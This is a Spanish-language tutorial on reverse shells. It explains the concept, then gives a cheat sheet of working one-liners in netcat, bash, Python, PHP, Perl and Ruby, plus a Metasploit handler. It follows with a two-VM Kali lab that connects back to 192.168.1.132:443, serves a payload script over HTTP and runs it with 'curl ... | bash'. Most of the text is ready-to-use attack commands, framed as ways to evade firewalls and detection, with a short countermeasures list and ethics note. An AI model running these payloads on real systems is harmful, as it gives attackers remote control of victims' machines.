### 🐚 ¿QUÉ ES UNA REVERSE SHELL?  
  
 Una reverse shell es una conexión remota donde el objetivo (víctima) establece una conexión de vuelta al atacante. Una vez que se establece esta conexión, el atacante puede ejecutar comandos en la máquina víctima como si tuviera una terminal interactiva.  
  
A diferencia de una bind shell, donde el atacante se conecta directamente a un puerto abierto en la máquina víctima, en una reverse shell es la víctima quien inicia la conexión hacia el atacante.  
   
#### ¿CÓMO FUNCIONA UNA REVERS SHELL?  
​  
El atacante abre un listener (escucha conexiones entrantes) en su máquina, por ejemplo, con Netcat en Kali Linux:
```
sudo nc -nlvp 443
```
​  
La víctima ejecuta un comando que establece una conexión de vuelta al atacante. Ejemplo con bash:
```
bash -i >& /dev/tcp/192.168.1.10/443 0>&1
```
​  
Una vez que la conexión se establece, el atacante recibe una shell interactiva y puede ejecutar comandos en la máquina víctima.  
  
#### VENTAJAS DE UNA REVERSE SHELL:  
  
#### EVITA CORTAFUEGOS:  
Muchas redes restringen conexiones entrantes, pero permiten conexiones saliente, o bien estas están sujetas a menos restricciones.  
  
#### MENOR DETECCIÓN:  
El tráfico saliente suele ser menos sospechoso que una conexión entrante, pudiendo así eludir software de protección.  
  
#### FLEXIBILIDAD:  
Es útil cuando no se puede abrir un puerto en la máquina víctima.  
  
#### TIPOS DE REVERSE SHELL:  
  
INTERACTIVE REVERSE SHELL: 
roporciona una sesión interactiva donde se pueden ejecutar comandos en tiempo real.  

NON-INTERACTIVE REVERSE SHELL:
Puede ejecutar comandos, pero sin una terminal interactiva completa. 

ENCRYPTED REVERSE SHELL:
Utiliza cifrado para evitar la detección por sistemas de seguridad.  
  
#### - HERRAMIENTAS COMUNES PARA REVERSE SHELLS -
  
#### NETCAT (nc):  
Atacante:
```
nc -nlvp [puerto]
```
Víctima:
```
nc -e /bin/bash [ip_atacante] [puerto]
```
  
#### BASH: 
```
bash -i >& /dev/tcp/[ip_atacante]/[puerto] 0>&1
```
  
#### PYTHON:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip_atacante]",[puerto]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
  
#### METASPLOIT: 
```
use exploit/multi/handler  
set payload linux/x86/meterpreter/reverse_tcp  
set lhost [ip_atacante]  
set lport [puerto]  
run
```
  
#### - EJEMPLOS DE COMANDOS DE REVERSE SHELLS POR LENGUAJES -
  
#### PHP: 
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[ip_atacante]/[puerto] 0>&1'"); ?>
```

#### PERL: 
```
perl -e 'use Socket;$i="[ip_atacante]";$p=[puerto];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```
  
#### RUBY: 
```
ruby -rsocket -e 'f=TCPSocket.open("[ip_atacante]",[puerto]).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```
  
#### CONTRAMEDIDAS Y PROTECCIÓN:  
  
- Filtrado de conexiones salientes: Restringir conexiones salientes solo a direcciones y puertos conocidos. 
- Monitoreo de tráfico: Implementar sistemas de detección de intrusiones (IDS/IPS) para identificar patrones sospechosos. 
- Firewalls: Configurar reglas estrictas para evitar conexiones no autorizadas. 
- Análisis de procesos: Monitorear procesos y comandos ejecutados en los sistemas.  
- Actualizaciones de seguridad: Mantener los sistemas y aplicaciones actualizados para evitar vulnerabilidades explotables.  
  
#### CASOS DE USO:  
  
- Pruebas de penetración: Evaluar la seguridad de una red o sistema.  
- Auditorias de seguridad: Comprobar políticas de cortafuegos y filtrado de tráfico.  
- Simulación de ataques: Entrenamiento para equipos de respuesta ante incidentes.  
​  
#### NOTA ÉTICA Y LEGAL:  
Utilizar técnicas como la Reverse Shell sin autorización es ILEGAL y ANTIÉTICO. Esta técnica debe usarse únicamente en entornos controlados, con el consentimiento explícito del propietario del sistema.  

----------------------------------
​
### 🐚 REVERSE SHELL POR COMANDO  
   
Una reverse shell es una técnica en la que una máquina objetivo (la víctima) establece una conexión de vuelta hacia una máquina atacante (usando, por ejemplo, Kali Linux). A diferencia de una shell tradicional, donde el atacante se conecta directamente a la víctima, en una reverse shell, el atacante espera una conexión entrante desde la víctima. Esto permite evadir cortafuegos y restricciones de red, ya que las conexiones salientes suelen estar menos restringidas. Una vez establecida, el atacante puede ejecutar comandos en el sistema comprometido como si tuviera acceso directo a su terminal. Herramientas como Metasploit y comandos como nc (Netcat) se utilizan comúnmente para implementar reverse shells.  
  
Una reverse shell es una conexión que permite al atacante obtener control remoto de una máquina víctima. En lugar de que el atacante inicie la conexión hacia la víctima, en una reverse shell es la máquina víctima la que establece una conexión hacia el atacante. Esto facilita evitar cortafuegos y otras medidas de seguridad, ya que muchas redes permiten conexiones salientes. Una vez establecida la conexión, el atacante puede ejecutar comandos en la máquina víctima como si tuviera acceso directo a su terminal.  
  
![b1.png](https://static.wixstatic.com/media/afa158_910fa25dd6564413bf8df253448cc689~mv2.png/v1/fill/w_326,h_348,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/b1.png)

En el siguiente ejercicio de ejemplo, usaremos dos máquinas virtuales con sistema operativo Kali Linux, ejecutadas desde una Máquina Anfitrión con Windows 10.  
  
A la izquierda vemos el esquema de la red. Ambas Máquinas Virtuales se encuentran configuradas con Adaptador Puente. La Máquina Atacante será Kali Linux 1 y la Máquina Víctima será Kali Linux 2.

![b2.png](https://static.wixstatic.com/media/afa158_793f7b52ebe64b5880777788eb198ddf~mv2.png/v1/fill/w_434,h_348,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/b2.png)

Primero, desde la Máquina Virtual atacante (Kali Linux 1) obtenemos  nuestra dirección IP con el comando ifconfig, verificando que es la IP local 192.168.1.132.  
 

![b4.png](https://static.wixstatic.com/media/afa158_cf4af10008f84bd0b616fa0295a050e0~mv2.png/v1/fill/w_351,h_145,al_c,lg_1,q_85,enc_avif,quality_auto/b4.png)

A continuación, también desde la máquina virtual atacante (Kali Linux 1) usamos netcat con privilegios de root (administrador) para poner la máquina en "escucha" por el puerto 443: 

```
sudo nc -nlvp 443
```

Para COMPROBAR la configuración de nuestro el ataque podemos usar la siguiente web:  
  
#### REVERSE SHELL GENERATOR:  
[https://www.revshells.com/](https://www.revshells.com/)  
  
Introducimos la IP atacante y el puerto 443 (usado comunmente para este cometido) por el cual establecer la conexión (reverse shell), y automáticamente nos facilita la línea de código resultante para escuchar (listener) y el payload que debe ser ejecutado en la Máquina Víctima (Kali Linux 2).  
 

![b3.png](https://static.wixstatic.com/media/afa158_07a50d78b87b460aa6be200884d7e7f6~mv2.png/v1/fill/w_852,h_424,al_c,q_90,usm_0.66_1.00_0.01,enc_avif,quality_auto/b3.png)

![b5.png](https://static.wixstatic.com/media/afa158_1dc6631b5db74ec2b252fbeb8347bab1~mv2.png/v1/crop/x_0,y_0,w_487,h_180/fill/w_429,h_156,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/b5.png)

Al ejecutar el payload desde la Máquina Víctima (Kali Linux 2) obtenemos un error, en este caso porque estamos queriendo ejecutar una línea de código en bash desde una shell zsh (por defecto en Kali Linux). Esto lo solucionamos cambiando a una bash shell con el comando bash.  
  
PAYLOAD:
```
sh -i >& /dev/tcp/192.168.1.132/443 0>&1
```

![b6.png](https://static.wixstatic.com/media/afa158_6852d9ddd44445da852ade7aad30e920~mv2.png/v1/fill/w_429,h_302,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/b6.png)

Al instante, en la máquina virtual atacante (Kali Linux 1) obtenemos una conexión entrante por el puerto 443 en escucha, obteniendo una bash shell de la máquina víctima (Kali Linux 2) en la que podemos introducir comandos como pwd o ls, entre otros, para navegar por el sistema de archivos o ejecutar líneas de comandos más complejas.

-------------

### 🐚 REVERSE SHELL POR ARCHIVO  
   
Mediante el siguiente procedimiento, abriremos una conexión entre máquinas que permita compartir archivos, método que usaremos para introducir y ejecutar un payload en la máquina víctima que nos permita obtener una Reverse Shell.  
 

![b1.png](https://static.wixstatic.com/media/afa158_910fa25dd6564413bf8df253448cc689~mv2.png/v1/fill/w_326,h_348,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/b1.png)

En el siguiente ejercicio de ejemplo, usaremos dos máquinas virtuales con sistema operativo Kali Linux, ejecutadas desde una Máquina Anfitrión con Windows 10.  
  
A la izquierda vemos el esquema de la red. Ambas Máquinas Virtuales se encuentran configuradas con Adaptador Puente. La Máquina Atacante será Kali Linux 1 y la Máquina Víctima será Kali Linux 2.  
   
#### CREAR EL PAYLOAD DESDE LA MÁQUINA ATACANTE:  
Crearemos un archivo .sh en la Máquina Atacante, con el siguiente contenido (se llamará revsh_payload.sh:  

```
#!/bin/bash

bash -i >& /dev/tcp/192.168.1.132/443 0>&1
```
  
##### LEVANTAR SERVIDOR HTTP EN LA MÁQUINA ATACANTE:  
Mediante el siguiente comando levantamos un servidor web abierto, que expone el contenido que se encuentre en la carpeta en la que estemos ejecutando la terminal de comandos. Aremos que el servidor sea accesible por el puerto 80, como es habitual para que poder entrar desde un navegador web:

```
python -m http.server 80
```

![b7.png](https://static.wixstatic.com/media/afa158_11a21f74952941bb9a48d59de0b34b0d~mv2.png/v1/fill/w_845,h_348,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/b7.png)

Hecho esto, si introducimos la IP de la Máquina Atacante (192.168.1.132) en la caja de direcciones de un navegador desde la Máquina Víctima, observaremos un acceso en tiempo real al contenido de la carpeta compartida desde la Máquina Atacante:  
 

![b8.png](https://static.wixstatic.com/media/afa158_c956a398b47b4018b5397846e2e6020d~mv2.png/v1/fill/w_646,h_252,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/b8.png)

De esta manera, podemos descargar el archivo y ejecutarlo en la Máquina Víctima mediante el comando:
```
./revsh_payload.sh
```
  
Para enviar una Reverse Shell a la IP 192.168.1.132 por el puerto 443 . Recordemos que la Máquina Atacante debe estar previamente en  escucha, con el comando:
```
sudo nc -nlvp 443
``` 
  
También, teniendo el servidor http abierto, podemos ejecutar el archivo revsh_payload.sh desde la consola de la Máquina Víctima, obteniendo la Reverse Shell en la Máquina Atacante, usando CURL con el siguiente comando:
```
curl http://192.168.1.132/revsh_payload.sh | bash
```
 
